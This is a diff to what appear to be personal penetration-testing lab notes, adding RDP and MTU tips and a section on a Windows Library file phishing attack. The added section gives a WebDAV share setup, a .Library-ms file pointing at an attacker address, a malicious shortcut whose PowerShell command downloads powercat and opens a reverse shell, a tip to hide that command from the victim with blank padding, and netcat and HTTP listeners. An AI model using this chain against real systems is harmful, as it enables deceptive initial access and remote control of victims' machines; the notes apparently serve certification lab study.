@@ -5,12 +5,21 @@
 ### RDP session
 
 ```
-xfreerdp /u:"offsec" /p:"lab" /v:"$TARGET" /cert-ignore /smart-sizing:2880x1800
+xfreerdp /u:"offsec" /p:"lab" /v:"$TARGET" /cert-ignore /smart-sizing:2880x1800 /drive:/workspace,share
+
 ```
 
 ### Use AZERTY
 
 Time & Language > Language & region > ... > Langage Options > Keyboards
+
+### MTU
+
+```
+sudo ip link set dev tun0 mtu 1250
+```
+
+
 
 
 
@@ -189,6 +198,80 @@ Sub MyMacro()
     CreateObject("Wscript.Shell").Run Str
 End Sub
 </code></pre>
+
+### Windows Library Files
+
+**.Library-ms** file extension : it connects users with data stored in remote locations like web services or shares
+
+#### Install webdav
+
+```
+pip3 install wsgidav
+
+pip install wsgidav cheroot
+
+```
+
+#### Set up webdav share
+
+```
+touch /home/test.txt
+
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/
+```
+
+#### Create config.Library-ms on target
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.192</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+```
+
+When the file has been clicked , we need to remove the serialized tag that windows adds in the XML in order to use this malicious file again on an other target
+
+#### Create a malicious .lnk
+
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.192:8000/powercat.ps1'); powercat -c 192.168.45.192 -p 4444 -e powershell"
+```
+
+\--> To be more stealthy , on can add basic commands and insert blanks before the reverse shell command so the malicious command will be out of the visible area for the user
+
+#### Listening for reverse shell
+
+```
+// Where powercat.ps1 is located
+
+python3 -m http.server 8000
+```
+
+```
+nc -lvnp 4444
+```
+
+
+
+
+
+
 
 
 
